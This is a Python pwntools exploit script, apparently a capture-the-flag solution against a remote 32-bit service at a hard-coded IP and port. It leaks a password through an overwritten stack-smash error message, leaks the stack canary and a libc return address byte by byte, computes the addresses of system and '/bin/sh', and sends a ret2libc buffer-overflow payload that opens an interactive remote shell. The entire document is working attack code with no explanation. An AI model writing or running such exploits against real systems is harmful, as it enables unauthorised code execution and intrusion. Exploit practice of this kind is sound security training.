from pwn import *

local = False

if local:
	HOST, PORT = '0.0.0.0', 31337
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	HOST, PORT = '52.199.49.117', 10005
	libc = ELF('/lib32/libc.so.6')

sock = lambda: remote(HOST, PORT)

r = sock()

password_ptr = 0x804a060
r.sendline('1')
r.sendline('a' * 2 + p32(password_ptr) * 0x150)
data = r.recvall()
print data

password = data.split('***: ')[1].split(' terminated')[0]
print password

r = sock()
base_len = cur_len = 1023

r.sendline('1')
r.sendline(password)
r.sendline('2')
r.sendline('A' * base_len)

data = ''
while len(data) < 4:
	r.sendline('4')
	r.sendline('A' * cur_len + 'A')
	r.sendline('3')
	r.recvuntil('Comment : ')
	data += r.recvline()[cur_len + 1:-1] + '\x00'
	print `data`
	cur_len = base_len + len(data)

canary = data[:4]
canary = u32(canary)

print hex(canary)

while cur_len < base_len + 100:
	r.sendline('4')
	r.sendline('A' * cur_len + 'A')
	r.sendline('3')
	r.recvuntil('Comment : ')
	data += r.recvline()[cur_len + 1:-1] + '\x00'
	print `data`
	cur_len = base_len + len(data)

libc_start_main_ret = u32(data[16:20])
delta = libc_start_main_ret - libc.symbols['__libc_start_main'] & 0xfff
print hex(delta)
libc_base = libc_start_main_ret - delta - libc.symbols['__libc_start_main']
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search('/bin/sh'))[0]
print hex(libc_base)
print hex(system)
print hex(libc_start_main_ret)

payload = 'A' * 1024 + p32(canary) + p32(0) + p32(0) + p32(0) + p32(system) + p32(0) + p32(binsh)
r.sendline('4')
r.sendline(payload)
r.sendline('')
r.sendline('!')
r.interactive()